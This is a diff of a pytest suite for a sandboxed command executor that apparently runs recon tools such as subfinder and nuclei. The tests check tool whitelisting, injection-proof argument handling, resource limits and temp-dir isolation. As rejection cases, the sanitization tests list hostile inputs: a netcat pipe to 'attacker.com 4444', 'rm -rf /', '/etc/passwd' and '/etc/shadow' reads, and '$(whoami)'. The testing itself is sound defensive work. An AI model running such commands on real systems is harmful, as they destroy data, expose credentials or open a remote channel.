@@ -2,392 +2,144 @@
 Comprehensive unit tests for SecureToolExecutor
 
 Tests cover:
-- Tool validation
-- Argument sanitization
-- Resource limits
-- Command execution
-- Error handling
-- Security controls
-- File operations
+- Tool validation and whitelisting
+- Argument sanitization (injection prevention, path traversal)
+- Context manager lifecycle (temp dir create/cleanup)
+- Resource limit enforcement via _preexec_new_pgrp()
+- Command execution via Popen + threading watchdog
+- stdout_file parameter (OS-level redirect)
+- File operations (create_input_file, read_output_file)
+- Tenant isolation
+- Security edge cases and negative paths
 """
 
-import pytest
-import subprocess
 import os
-import tempfile
-import shutil
-from unittest.mock import patch, MagicMock, call
+import resource
+import subprocess
+import threading
 from pathlib import Path
+from unittest.mock import MagicMock, patch
+
+import pytest
 
 from app.utils.secure_executor import SecureToolExecutor, ToolExecutionError
 
+# Patch targets
+_POPEN = "app.utils.secure_executor.subprocess.Popen"
+_TIMER = "app.utils.secure_executor.threading.Timer"
+_OS_KILLPG = "app.utils.secure_executor.os.killpg"
+_OS_SETPGRP = "app.utils.secure_executor.os.setpgrp"
+_RESOURCE_SETRLIMIT = "app.utils.secure_executor.resource.setrlimit"
 
-class TestSecureToolExecutorValidation:
-    """Test tool validation and whitelisting"""
 
-    def test_validate_allowed_tool(self):
-        """Test validation accepts whitelisted tools"""
+def _make_mock_proc(returncode=0, stdout="", stderr=""):
+    proc = MagicMock()
+    proc.communicate.return_value = (stdout, stderr)
+    proc.returncode = returncode
+    proc.poll.return_value = returncode
+    proc.pid = 99999
+    return proc
+
+
+class _ImmediateTimer:
+    """Drop-in for threading.Timer that fires callback synchronously on start()."""
+
+    def __init__(self, interval, callback):
+        self.interval = interval
+        self.daemon = True
+        self._callback = callback
+
+    def start(self):
+        self._callback()
+
+    def cancel(self):
+        pass
+
+
+# 1. Tool validation
+
+
+class TestToolValidation:
+    """validate_tool() whitelist enforcement"""
+
+    def test_allowed_tools_accepted(self):
         executor = SecureToolExecutor(tenant_id=1)
+        for tool in ("subfinder", "dnsx", "httpx", "naabu", "nuclei", "katana"):
+            assert executor.validate_tool(tool) == tool
 
-        for tool in ["subfinder", "dnsx", "httpx", "naabu", "nuclei"]:
-            result = executor.validate_tool(tool)
-            assert result == tool
-
-    def test_validate_disallowed_tool(self):
-        """Test validation rejects non-whitelisted tools"""
+    def test_disallowed_tool_raises(self):
         executor = SecureToolExecutor(tenant_id=1)
-
         with pytest.raises(ToolExecutionError, match="not allowed"):
             executor.validate_tool("rm")
 
+    def test_curl_rejected(self):
+        executor = SecureToolExecutor(tenant_id=1)
         with pytest.raises(ToolExecutionError, match="not allowed"):
             executor.validate_tool("curl")
 
+    def test_path_prefixed_tool_rejected(self):
+        executor = SecureToolExecutor(tenant_id=1)
         with pytest.raises(ToolExecutionError, match="not allowed"):
             executor.validate_tool("/usr/bin/subfinder")
 
-    def test_validate_command_injection_attempt(self):
-        """Test validation blocks command injection attempts"""
+    def test_tool_with_semicolon_rejected(self):
         executor = SecureToolExecutor(tenant_id=1)
-
-        with pytest.raises(ToolExecutionError):
+        with pytest.raises(ToolExecutionError, match="not allowed"):
             executor.validate_tool("subfinder; rm -rf /")
 
-        with pytest.raises(ToolExecutionError):
+    def test_tool_with_ampersand_rejected(self):
+        executor = SecureToolExecutor(tenant_id=1)
+        with pytest.raises(ToolExecutionError, match="not allowed"):
             executor.validate_tool("subfinder && cat /etc/passwd")
 
-
-class TestSecureToolExecutorSanitization:
-    """Test argument sanitization"""
-
-    def test_sanitize_basic_args(self):
-        """Test sanitization of basic arguments"""
+    def test_empty_string_rejected(self):
         executor = SecureToolExecutor(tenant_id=1)
+        with pytest.raises(ToolExecutionError, match="not allowed"):
+            executor.validate_tool("")
 
-        args = ["-d", "example.com", "-silent"]
-        sanitized = executor.sanitize_args(args)
 
-        assert len(sanitized) == 3
-        assert all(isinstance(arg, str) for arg in sanitized)
+# 2. Argument sanitization
 
-    def test_sanitize_removes_dangerous_chars(self):
-        """Test sanitization quotes special characters"""
+
+class TestArgumentSanitization:
+    """sanitize_args() injection prevention and path validation"""
+
+    def test_basic_args_pass_through(self):
         executor = SecureToolExecutor(tenant_id=1)
+        result = executor.sanitize_args(["-d", "example.com", "-silent"])
+        assert result == ["-d", "example.com", "-silent"]
 
-        args = ["domain.com; rm -rf /"]
-        sanitized = executor.sanitize_args(args)
-
-        # Should be quoted/escaped
-        assert len(sanitized) == 1
-        # The argument should be safely quoted
-        assert ";" in sanitized[0] or "rm" not in sanitized[0]
-
-    def test_sanitize_file_paths_outside_temp_dir(self):
-        """Test sanitization rejects paths outside temp directory"""
+    def test_empty_list_returns_empty(self):
         executor = SecureToolExecutor(tenant_id=1)
+        assert executor.sanitize_args([]) == []
 
-        with executor as exec_ctx:
-            args = ["/etc/passwd", "./../../etc/shadow"]
-            sanitized = exec_ctx.sanitize_args(args)
-
-            # Paths outside temp dir should be rejected (length reduced)
-            assert len(sanitized) < len(args)
-
-    def test_sanitize_preserves_valid_temp_paths(self):
-        """Test sanitization preserves valid temp directory paths"""
-        with SecureToolExecutor(tenant_id=1) as executor:
-            temp_file = os.path.join(executor.temp_dir, "test.txt")
-
-            args = [temp_file]
-            sanitized = executor.sanitize_args(args)
-
-            # Valid path should be preserved (though quoted)
-            assert len(sanitized) == 1
-
-    def test_sanitize_strips_whitespace(self):
-        """Test sanitization strips whitespace"""
+    def test_dangerous_char_semicolon_drops_arg(self):
         executor = SecureToolExecutor(tenant_id=1)
+        result = executor.sanitize_args(["domain.com; rm -rf /"])
+        assert result == []
 
-        args = ["  example.com  ", "\tdomain.org\n"]
-        sanitized = executor.sanitize_args(args)
-
-        assert "example.com" in sanitized[0]
-        assert "domain.org" in sanitized[1]
-
-
-class TestSecureToolExecutorContextManager:
-    """Test context manager behavior"""
-
-    def test_context_manager_creates_temp_dir(self):
-        """Test context manager creates temporary directory"""
+    def test_dangerous_char_pipe_drops_arg(self):
         executor = SecureToolExecutor(tenant_id=1)
+        result = executor.sanitize_args(["domain.com | nc attacker.com 4444"])
+        assert result == []
 
-        assert executor.temp_dir is None
-
-        with executor as exec_ctx:
-            assert exec_ctx.temp_dir is not None
-            assert os.path.exists(exec_ctx.temp_dir)
-            assert "tenant_1_" in str(exec_ctx.temp_dir)
-            temp_dir = exec_ctx.temp_dir
-
-        # Directory should be cleaned up after exit
-        assert not os.path.exists(temp_dir)
-
-    def test_context_manager_cleanup_on_exception(self):
-        """Test context manager cleans up even on exception"""
-        try:
-            with SecureToolExecutor(tenant_id=1) as executor:
-                temp_dir = executor.temp_dir
-                raise ValueError("Test exception")
-        except ValueError:
-            pass
-
-        # Directory should still be cleaned up
-        assert not os.path.exists(temp_dir)
-
-    def test_multiple_executors_isolated(self):
-        """Test multiple executors have isolated temp directories"""
-        with SecureToolExecutor(tenant_id=1) as exec1:
-            with SecureToolExecutor(tenant_id=2) as exec2:
-                assert exec1.temp_dir != exec2.temp_dir
-                assert "tenant_1_" in exec1.temp_dir
-                assert "tenant_2_" in exec2.temp_dir
-
-
-class TestSecureToolExecutorFileOperations:
-    """Test file operations"""
-
-    def test_create_input_file(self):
-        """Test creating input file in temp directory"""
-        with SecureToolExecutor(tenant_id=1) as executor:
-            content = "example.com\ntest.org\n"
-            file_path = executor.create_input_file("domains.txt", content)
-
-            assert os.path.exists(file_path)
-            assert executor.temp_dir in file_path
-
-            with open(file_path, "r") as f:
-                assert f.read() == content
-
-    def test_create_input_file_without_context(self):
-        """Test creating input file fails without context manager"""
+    def test_dangerous_char_ampersand_drops_arg(self):
         executor = SecureToolExecutor(tenant_id=1)
+        result = executor.sanitize_args(["domain.com && whoami"])
+        assert result == []
 
-        with pytest.raises(ToolExecutionError, match="not initialized"):
-            executor.create_input_file("test.txt", "content")
-
-    def test_read_output_file(self):
-        """Test reading output file from temp directory"""
-        with SecureToolExecutor(tenant_id=1) as executor:
-            # Create a file first
-            test_content = "result1\nresult2\nresult3\n"
-            file_path = os.path.join(executor.temp_dir, "output.txt")
-
-            with open(file_path, "w") as f:
-                f.write(test_content)
-
-            # Read it back
-            content = executor.read_output_file("output.txt")
-            assert content == test_content
-
-    def test_read_nonexistent_output_file(self):
-        """Test reading non-existent file returns empty string"""
-        with SecureToolExecutor(tenant_id=1) as executor:
-            content = executor.read_output_file("nonexistent.txt")
-            assert content == ""
-
-    def test_read_output_file_without_context(self):
-        """Test reading output file fails without context manager"""
+    def test_dangerous_char_backtick_drops_arg(self):
         executor = SecureToolExecutor(tenant_id=1)
+        result = executor.sanitize_args(["domain.com`id`"])
+        assert result == []
 
-        with pytest.raises(ToolExecutionError, match="not initialized"):
-            executor.read_output_file("test.txt")
-
-
-class TestSecureToolExecutorExecution:
-    """Test tool execution"""
-
-    @patch("subprocess.run")
-    def test_execute_successful(self, mock_run):
-        """Test successful tool execution"""
-        mock_run.return_value = MagicMock(returncode=0, stdout="sub1.example.com\nsub2.example.com", stderr="")
-
-        with SecureToolExecutor(tenant_id=1) as executor:
-            returncode, stdout, stderr = executor.execute("subfinder", ["-d", "example.com", "-silent"])
-
-            assert returncode == 0
-            assert "sub1.example.com" in stdout
-            mock_run.assert_called_once()
-
-    @patch("subprocess.run")
-    def test_execute_with_timeout(self, mock_run):
-        """Test execution timeout"""
-        mock_run.side_effect = subprocess.TimeoutExpired("subfinder", 10)
-
-        with SecureToolExecutor(tenant_id=1) as executor:
-            with pytest.raises(ToolExecutionError, match="timed out"):
-                executor.execute("subfinder", ["-d", "example.com"], timeout=10)
-
-    @patch("subprocess.run")
-    def test_execute_subprocess_error(self, mock_run):
-        """Test subprocess execution error"""
-        mock_run.side_effect = subprocess.SubprocessError("Command failed")
-
-        with SecureToolExecutor(tenant_id=1) as executor:
-            with pytest.raises(ToolExecutionError, match="Execution failed"):
-                executor.execute("subfinder", ["-d", "example.com"])
-
-    @patch("subprocess.run")
-    def test_execute_invalid_tool(self, mock_run):
-        """Test execution with invalid tool"""
-        with SecureToolExecutor(tenant_id=1) as executor:
-            with pytest.raises(ToolExecutionError, match="not allowed"):
-                executor.execute("malicious_tool", ["-arg"])
-
-            # subprocess.run should never be called
-            mock_run.assert_not_called()
-
-    @patch("subprocess.run")
-    def test_execute_uses_restricted_env(self, mock_run):
-        """Test execution uses restricted environment"""
-        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
-
-        with SecureToolExecutor(tenant_id=1) as executor:
-            executor.execute("subfinder", ["-d", "example.com"])
-
-            # Check environment variables passed to subprocess
-            call_kwargs = mock_run.call_args[1]
-            env = call_kwargs["env"]
-
-            assert "PATH" in env
-            assert "HOME" in env
-            assert env["HOME"] == executor.temp_dir
-
-    @patch("subprocess.run")
-    def test_execute_uses_temp_dir_as_cwd(self, mock_run):
-        """Test execution uses temp directory as working directory"""
-        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
-
-        with SecureToolExecutor(tenant_id=1) as executor:
-            executor.execute("subfinder", ["-d", "example.com"])
-
-            call_kwargs = mock_run.call_args[1]
-            assert call_kwargs["cwd"] == executor.temp_dir
-
-    @patch("subprocess.run")
-    def test_execute_custom_timeout(self, mock_run):
-        """Test execution with custom timeout"""
-        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
-
-        with SecureToolExecutor(tenant_id=1) as executor:
-            executor.execute("subfinder", ["-d", "example.com"], timeout=300)
-
-            call_kwargs = mock_run.call_args[1]
-            assert call_kwargs["timeout"] == 300
-
-    @patch("subprocess.run")
-    def test_execute_default_timeout(self, mock_run):
-        """Test execution uses default timeout"""
-        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
-
-        with SecureToolExecutor(tenant_id=1) as executor:
-            executor.execute("subfinder", ["-d", "example.com"])
-
-            call_kwargs = mock_run.call_args[1]
-            assert call_kwargs["timeout"] == SecureToolExecutor.DEFAULT_TIMEOUT
-
-    @patch("subprocess.run")
-    def test_execute_non_zero_return_code(self, mock_run):
-        """Test execution handles non-zero return code"""
-        mock_run.return_value = MagicMock(returncode=1, stdout="", stderr="Error: invalid domain")
-
-        with SecureToolExecutor(tenant_id=1) as executor:
-            returncode, stdout, stderr = executor.execute("subfinder", ["-d", "invalid..domain"])
-
-            assert returncode == 1
-            assert "Error" in stderr
-
-
-class TestSecureToolExecutorResourceLimits:
-    """Test resource limit enforcement"""
-
-    @patch("resource.setrlimit")
-    def test_set_resource_limits_cpu(self, mock_setrlimit):
-        """Test CPU time limit is set"""
+    def test_dangerous_char_dollar_drops_arg(self):
         executor = SecureToolExecutor(tenant_id=1)
-        executor.set_resource_limits()
+        result = executor.sanitize_args(["domain.com$(whoami)"])
+        assert result == []
 
-        # Check that CPU limit was set
-        calls = mock_setrlimit.call_args_list
-        cpu_call = [c for c in calls if c[0][0] == 1]  # RLIMIT_CPU = 1
-        assert len(cpu_call) > 0
-
-    @patch("resource.setrlimit")
-    def test_set_resource_limits_memory(self, mock_setrlimit):
-        """Test memory limit is set"""
+    def test_all_injection_args_dropped(self):
         executor = SecureToolExecutor(tenant_id=1)
-        executor.set_resource_limits()
-
-        # Check that memory limit was set
-        calls = mock_setrlimit.call_args_list
-        mem_call = [c for c in calls if c[0][0] == 9]  # RLIMIT_AS = 9
-        assert len(mem_call) > 0
-
-    @patch("resource.setrlimit")
-    def test_set_resource_limits_file_size(self, mock_setrlimit):
-        """Test file size limit is set"""
-        executor = SecureToolExecutor(tenant_id=1)
-        executor.set_resource_limits()
-
-        # Check that file size limit was set
-        calls = mock_setrlimit.call_args_list
-        file_call = [c for c in calls if c[0][0] == 1]  # RLIMIT_FSIZE
-        assert len(file_call) > 0
-
-    @patch("resource.setrlimit")
-    def test_set_resource_limits_handles_errors(self, mock_setrlimit):
-        """Test resource limit errors are handled gracefully"""
-        mock_setrlimit.side_effect = OSError("Not permitted")
-
-        executor = SecureToolExecutor(tenant_id=1)
-        # Should not raise exception
-        executor.set_resource_limits()
-
-
-class TestSecureToolExecutorSecurityScenarios:
-    """Test security scenarios and edge cases"""
-
-    def test_tenant_isolation(self):
-        """Test different tenants have isolated environments"""
-        with SecureToolExecutor(tenant_id=1) as exec1:
-            with SecureToolExecutor(tenant_id=2) as exec2:
-                # Create files in each tenant's directory
-                exec1.create_input_file("data.txt", "tenant1")
-                exec2.create_input_file("data.txt", "tenant2")
-
-                # Files should be isolated
-                content1 = exec1.read_output_file("data.txt")
-                content2 = exec2.read_output_file("data.txt")
-
-                assert content1 == "tenant1"
-                assert content2 == "tenant2"
-
-    def test_path_traversal_prevention(self):
-        """Test path traversal attacks are prevented"""
-        with SecureToolExecutor(tenant_id=1) as executor:
-            dangerous_args = ["../../../etc/passwd", "../../root/.ssh/id_rsa", "/etc/shadow"]
-
-            sanitized = executor.sanitize_args(dangerous_args)
-
-            # All dangerous paths should be rejected or neutralized
-            for arg in sanitized:
-                assert "/etc/passwd" not in arg or executor.temp_dir in arg
-
-    def test_command_chaining_prevention(self):
-        """Test command chaining is prevented"""
-        executor = SecureToolExecutor(tenant_id=1)
-
-        # These should all be quoted/escaped properly
         dangerous = [
             "domain.com; cat /etc/passwd",
             "domain.com && rm -rf /",
@@ -395,82 +147,459 @@ class TestSecureToolExecutorSecurityScenarios:
             "domain.com`rm -rf /`",
             "domain.com$(whoami)",
         ]
+        result = executor.sanitize_args(dangerous)
+        assert result == []
 
-        sanitized = executor.sanitize_args(dangerous)
+    def test_strips_leading_trailing_whitespace(self):
+        executor = SecureToolExecutor(tenant_id=1)
+        result = executor.sanitize_args(["  example.com  ", "\tdomain.org\t"])
+        assert result == ["example.com", "domain.org"]
 
-        # All should be quoted/escaped
-        for arg in sanitized:
-            # shlex.quote wraps in single quotes
-            assert arg.startswith("'") or not any(c in arg for c in [";", "&", "|", "`", "$"])
+    def test_newline_in_arg_drops_arg(self):
+        executor = SecureToolExecutor(tenant_id=1)
+        result = executor.sanitize_args(["domain.org\n"])
+        assert result == []
 
-    @patch("subprocess.run")
-    def test_prevents_environment_variable_injection(self, mock_run):
-        """Test environment variables can't be injected"""
-        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
+    def test_none_converted_to_string(self):
+        executor = SecureToolExecutor(tenant_id=1)
+        result = executor.sanitize_args([None, "valid"])
+        assert "valid" in result
+        assert len(result) == 2
 
+    def test_unicode_args_pass_through(self):
+        executor = SecureToolExecutor(tenant_id=1)
+        result = executor.sanitize_args(["xn--fiq228c5hs.example.com", "domain.org"])
+        assert len(result) == 2
+
+    def test_very_long_arg_passes_through(self):
+        executor = SecureToolExecutor(tenant_id=1)
+        long_arg = "a" * 10_000
+        result = executor.sanitize_args([long_arg])
+        assert len(result) == 1
+
+    def test_absolute_path_outside_temp_dir_dropped(self):
         with SecureToolExecutor(tenant_id=1) as executor:
-            # Try to inject environment variable
-            executor.execute("subfinder", ["-d", "example.com"])
+            result = executor.sanitize_args(["/etc/passwd"])
+            assert result == []
 
-            # Check environment is restricted
-            env = mock_run.call_args[1]["env"]
-
-            # Should only have whitelisted env vars
-            assert "PATH" in env
-            assert "HOME" in env
-            assert "LANG" in env
-            # Should NOT have dangerous variables
-            assert "LD_PRELOAD" not in env
-            assert "LD_LIBRARY_PATH" not in env
-
-
-class TestSecureToolExecutorEdgeCases:
-    """Test edge cases and error conditions"""
-
-    def test_empty_arguments_list(self):
-        """Test execution with empty arguments"""
-        executor = SecureToolExecutor(tenant_id=1)
-        sanitized = executor.sanitize_args([])
-        assert sanitized == []
-
-    def test_unicode_in_arguments(self):
-        """Test handling of unicode characters"""
-        executor = SecureToolExecutor(tenant_id=1)
-        args = ["测试.example.com", "тест.org"]
-        sanitized = executor.sanitize_args(args)
-        assert len(sanitized) == 2
-
-    def test_very_long_arguments(self):
-        """Test handling of very long arguments"""
-        executor = SecureToolExecutor(tenant_id=1)
-        long_arg = "a" * 10000
-        sanitized = executor.sanitize_args([long_arg])
-        assert len(sanitized) == 1
-
-    def test_none_arguments(self):
-        """Test handling of None in arguments"""
-        executor = SecureToolExecutor(tenant_id=1)
-        # Should convert None to string
-        sanitized = executor.sanitize_args([None, "valid", None])
-        assert len(sanitized) == 3
-
-    @patch("subprocess.run")
-    def test_execute_capture_output_false(self, mock_run):
-        """Test execution with capture_output=False"""
-        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
-
+    def test_absolute_path_inside_temp_dir_allowed(self):
         with SecureToolExecutor(tenant_id=1) as executor:
-            executor.execute("subfinder", ["-d", "example.com"], capture_output=False)
+            temp_file = str(executor.temp_dir / "targets.txt")
+            result = executor.sanitize_args([temp_file])
+            assert result == [temp_file]
 
-            call_kwargs = mock_run.call_args[1]
-            assert call_kwargs["capture_output"] == False
+    def test_safe_path_prefix_allowed(self):
+        executor = SecureToolExecutor(tenant_id=1)
+        safe = "/home/appuser/nuclei-templates/cves/"
+        result = executor.sanitize_args([safe])
+        assert result == [safe]
 
-    def test_tenant_id_types(self):
-        """Test different tenant ID types"""
-        # Should accept integer
-        exec1 = SecureToolExecutor(tenant_id=1)
-        assert exec1.tenant_id == 1
+    def test_relative_dotslash_outside_temp_dropped(self):
+        with SecureToolExecutor(tenant_id=1) as executor:
+            result = executor.sanitize_args(["./../../etc/shadow"])
+            assert result == []
 
-        # Should accept string that looks like int
-        exec2 = SecureToolExecutor(tenant_id=999)
-        assert exec2.tenant_id == 999
+
+# 3. Context manager lifecycle
+
+
+class TestContextManager:
+    """__enter__ / __exit__ temp-dir lifecycle"""
+
+    def test_temp_dir_none_before_enter(self):
+        executor = SecureToolExecutor(tenant_id=1)
+        assert executor.temp_dir is None
+
+    def test_enter_creates_temp_dir(self):
+        with SecureToolExecutor(tenant_id=1) as executor:
+            assert executor.temp_dir is not None
+            assert executor.temp_dir.exists()
+            assert "tenant_1_" in str(executor.temp_dir)
+
+    def test_exit_removes_temp_dir(self):
+        with SecureToolExecutor(tenant_id=1) as executor:
+            temp_dir = executor.temp_dir
+        assert not temp_dir.exists()
+
+    def test_cleanup_on_exception(self):
+        try:
+            with SecureToolExecutor(tenant_id=1) as executor:
+                temp_dir = executor.temp_dir
+                raise RuntimeError("intentional")
+        except RuntimeError:
+            pass
+        assert not temp_dir.exists()
+
+    def test_multiple_executors_isolated_dirs(self):
+        with SecureToolExecutor(tenant_id=1) as ex1:
+            with SecureToolExecutor(tenant_id=2) as ex2:
+                assert ex1.temp_dir != ex2.temp_dir
+                assert "tenant_1_" in str(ex1.temp_dir)
+                assert "tenant_2_" in str(ex2.temp_dir)
+
+
+# 4. Resource limits
+
+
+class TestResourceLimits:
+    """_preexec_new_pgrp() sets OS resource limits"""
+
+    @patch(_OS_SETPGRP)
+    @patch(_RESOURCE_SETRLIMIT)
+    def test_sets_cpu_limit(self, mock_setrlimit, mock_setpgrp):
+        executor = SecureToolExecutor(tenant_id=1)
+        executor._preexec_new_pgrp()
+        ids_set = [c[0][0] for c in mock_setrlimit.call_args_list]
+        assert resource.RLIMIT_CPU in ids_set
+
+    @patch(_OS_SETPGRP)
+    @patch(_RESOURCE_SETRLIMIT)
+    def test_sets_memory_limit(self, mock_setrlimit, mock_setpgrp):
+        executor = SecureToolExecutor(tenant_id=1)
+        executor._preexec_new_pgrp()
+        ids_set = [c[0][0] for c in mock_setrlimit.call_args_list]
+        assert resource.RLIMIT_AS in ids_set
+
+    @patch(_OS_SETPGRP)
+    @patch(_RESOURCE_SETRLIMIT)
+    def test_sets_file_size_limit(self, mock_setrlimit, mock_setpgrp):
+        executor = SecureToolExecutor(tenant_id=1)
+        executor._preexec_new_pgrp()
+        ids_set = [c[0][0] for c in mock_setrlimit.call_args_list]
+        assert resource.RLIMIT_FSIZE in ids_set
+
+    @patch(_OS_SETPGRP)
+    @patch(_RESOURCE_SETRLIMIT)
+    def test_calls_setpgrp(self, mock_setrlimit, mock_setpgrp):
+        executor = SecureToolExecutor(tenant_id=1)
+        executor._preexec_new_pgrp()
+        mock_setpgrp.assert_called_once()
+
+    @patch(_OS_SETPGRP)
+    @patch(_RESOURCE_SETRLIMIT)
+    def test_setrlimit_errors_swallowed(self, mock_setrlimit, mock_setpgrp):
+        mock_setrlimit.side_effect = OSError("not permitted")
+        executor = SecureToolExecutor(tenant_id=1)
+        executor._preexec_new_pgrp()  # must not raise
+
+
+# 5. Execute happy paths
+
+
+class TestExecuteSuccess:
+    """execute() normal behaviour"""
+
+    def test_returns_tuple_on_success(self):
+        proc = _make_mock_proc(returncode=0, stdout="sub1.example.com\n", stderr="")
+        with patch(_POPEN, return_value=proc):
+            with SecureToolExecutor(tenant_id=1) as executor:
+                rc, stdout, stderr = executor.execute("subfinder", ["-d", "example.com"])
+        assert rc == 0
+        assert "sub1.example.com" in stdout
+        assert stderr == ""
+
+    def test_popen_called_once(self):
+        proc = _make_mock_proc()
+        with patch(_POPEN, return_value=proc) as mock_popen:
+            with SecureToolExecutor(tenant_id=1) as executor:
+                executor.execute("subfinder", ["-d", "example.com"])
+        mock_popen.assert_called_once()
+
+    def test_cmd_has_tool_as_first_element(self):
+        proc = _make_mock_proc()
+        with patch(_POPEN, return_value=proc) as mock_popen:
+            with SecureToolExecutor(tenant_id=1) as executor:
+                executor.execute("subfinder", ["-d", "example.com"])
+        cmd = mock_popen.call_args[0][0]
+        assert cmd[0] == "subfinder"
+
+    def test_env_has_restricted_path(self):
+        proc = _make_mock_proc()
+        with patch(_POPEN, return_value=proc) as mock_popen:
+            with SecureToolExecutor(tenant_id=1) as executor:
+                executor.execute("subfinder", ["-d", "example.com"])
+        env = mock_popen.call_args[1]["env"]
+        assert "PATH" in env
+        assert "LD_PRELOAD" not in env
+        assert "LD_LIBRARY_PATH" not in env
+
+    def test_cwd_is_temp_dir_string(self):
+        proc = _make_mock_proc()
+        with patch(_POPEN, return_value=proc) as mock_popen:
+            with SecureToolExecutor(tenant_id=1) as executor:
+                executor.execute("subfinder", ["-d", "example.com"])
+                cwd = mock_popen.call_args[1]["cwd"]
+                assert cwd == str(executor.temp_dir)
+
+    def test_shell_is_false(self):
+        proc = _make_mock_proc()
+        with patch(_POPEN, return_value=proc) as mock_popen:
+            with SecureToolExecutor(tenant_id=1) as executor:
+                executor.execute("subfinder", ["-d", "example.com"])
+        assert mock_popen.call_args[1]["shell"] is False
+
+    def test_non_zero_returncode_returned(self):
+        proc = _make_mock_proc(returncode=1, stderr="Error: host not found")
+        with patch(_POPEN, return_value=proc):
+            with SecureToolExecutor(tenant_id=1) as executor:
+                rc, _, stderr = executor.execute("subfinder", ["-d", "invalid..domain"])
+        assert rc == 1
+        assert "Error" in stderr
+
+    def test_invalid_tool_raises_before_popen(self):
+        with patch(_POPEN) as mock_popen:
+            with SecureToolExecutor(tenant_id=1) as executor:
+                with pytest.raises(ToolExecutionError, match="not allowed"):
+                    executor.execute("malicious_tool", [])
+        mock_popen.assert_not_called()
+
+    def test_custom_timeout_passed_to_timer(self):
+        proc = _make_mock_proc()
+        captured_intervals = []
+
+        class _CapturingTimer:
+            def __init__(self, interval, callback):
+                captured_intervals.append(interval)
+                self.daemon = True
+
+            def start(self):
+                pass
+
+            def cancel(self):
+                pass
+
+        with patch(_POPEN, return_value=proc), patch(_TIMER, _CapturingTimer):
+            with SecureToolExecutor(tenant_id=1) as executor:
+                executor.execute("subfinder", ["-d", "example.com"], timeout=42)
+
+        assert captured_intervals == [42]
+
+    def test_default_timeout_uses_settings_value(self):
+        proc = _make_mock_proc()
+        captured_intervals = []
+
+        class _CapturingTimer:
+            def __init__(self, interval, callback):
+                captured_intervals.append(interval)
+                self.daemon = True
+
+            def start(self):
+                pass
+
+            def cancel(self):
+                pass
+
+        with patch(_POPEN, return_value=proc), patch(_TIMER, _CapturingTimer):
+            with SecureToolExecutor(tenant_id=1) as executor:
+                expected_timeout = executor.timeout
+                executor.execute("subfinder", ["-d", "example.com"])
+
+        assert captured_intervals == [expected_timeout]
+
+    def test_capture_output_false_uses_devnull(self):
+        proc = _make_mock_proc()
+        with patch(_POPEN, return_value=proc) as mock_popen:
+            with SecureToolExecutor(tenant_id=1) as executor:
+                executor.execute("subfinder", ["-d", "example.com"], capture_output=False)
+        assert mock_popen.call_args[1]["stdout"] == subprocess.DEVNULL
+
+    def test_capture_output_true_uses_pipe(self):
+        proc = _make_mock_proc()
+        with patch(_POPEN, return_value=proc) as mock_popen:
+            with SecureToolExecutor(tenant_id=1) as executor:
+                executor.execute("subfinder", ["-d", "example.com"], capture_output=True)
+        assert mock_popen.call_args[1]["stdout"] == subprocess.PIPE
+
+
+# 6. Execute error paths
+
+
+class TestExecuteErrors:
+    """execute() error and negative paths"""
+
+    def test_subprocess_error_raises_tool_execution_error(self):
+        with patch(_POPEN, side_effect=subprocess.SubprocessError("Command failed")):
+            with SecureToolExecutor(tenant_id=1) as executor:
+                with pytest.raises(ToolExecutionError, match="Execution failed"):
+                    executor.execute("subfinder", ["-d", "example.com"])
+
+    def test_generic_exception_raises_tool_execution_error(self):
+        with patch(_POPEN, side_effect=OSError("No such file")):
+            with SecureToolExecutor(tenant_id=1) as executor:
+                with pytest.raises(ToolExecutionError, match="Unexpected error"):
+                    executor.execute("subfinder", ["-d", "example.com"])
+
+    def test_timeout_raises_tool_execution_error(self):
+        proc = _make_mock_proc()
+        with patch(_POPEN, return_value=proc), patch(_TIMER, _ImmediateTimer), patch(_OS_KILLPG):
+            with SecureToolExecutor(tenant_id=1) as executor:
+                with pytest.raises(ToolExecutionError, match="timed out"):
+                    executor.execute("subfinder", ["-d", "example.com"], timeout=1)
+
+    def test_timeout_message_includes_duration(self):
+        proc = _make_mock_proc()
+        with patch(_POPEN, return_value=proc), patch(_TIMER, _ImmediateTimer), patch(_OS_KILLPG):
+            with SecureToolExecutor(tenant_id=1) as executor:
+                with pytest.raises(ToolExecutionError, match="1s"):
+                    executor.execute("subfinder", ["-d", "example.com"], timeout=1)
+
+
+# 7. stdout_file parameter
+
+
+class TestStdoutFile:
+    """stdout_file OS-level redirect behaviour"""
+
+    def test_popen_receives_file_object_not_pipe(self):
+        """When stdout_file is set, Popen must get a real file object (not PIPE/DEVNULL)."""
+        proc = _make_mock_proc(stdout=None, stderr="")
+        with patch(_POPEN, return_value=proc) as mock_popen:
+            with SecureToolExecutor(tenant_id=1) as executor:
+                out_path = str(executor.temp_dir / "katana.json")
+                executor.execute("subfinder", ["-d", "example.com"], stdout_file=out_path)
+
+        stdout_arg = mock_popen.call_args[1]["stdout"]
+        assert hasattr(stdout_arg, "write"), "stdout must be a file object"
+        assert not isinstance(stdout_arg, int), "stdout must not be an int sentinel"
+
+    def test_returns_empty_stdout_string(self):
+        """execute() must return empty stdout string when stdout_file is used."""
+        proc = _make_mock_proc(stdout=None, stderr="")
+        with patch(_POPEN, return_value=proc):
+            with SecureToolExecutor(tenant_id=1) as executor:
+                out_path = str(executor.temp_dir / "out.json")
+                rc, stdout, _ = executor.execute("subfinder", ["-d", "example.com"], stdout_file=out_path)
+        assert stdout == ""
+
+    def test_takes_precedence_over_capture_output(self):
+        """stdout_file overrides capture_output=True."""
+        proc = _make_mock_proc(stdout=None, stderr="")
+        with patch(_POPEN, return_value=proc) as mock_popen:
+            with SecureToolExecutor(tenant_id=1) as executor:
+                out_path = str(executor.temp_dir / "out.json")
+                executor.execute(
+                    "subfinder",
+                    ["-d", "example.com"],
+                    capture_output=True,
+                    stdout_file=out_path,
+                )
+        stdout_arg = mock_popen.call_args[1]["stdout"]
+        assert hasattr(stdout_arg, "write"), "stdout_file must override capture_output=True"
+
+    def test_real_echo_writes_to_file(self):
+        """Integration: real echo binary writes output to stdout_file path."""
+        with SecureToolExecutor(tenant_id=1) as executor:
+            original = executor.allowed_tools
+            executor.allowed_tools = original | {"echo"}
+            out_path = str(executor.temp_dir / "echo_out.txt")
+            rc, stdout, _ = executor.execute("echo", ["hello_easm"], stdout_file=out_path)
+
+        assert rc == 0
+        assert stdout == ""
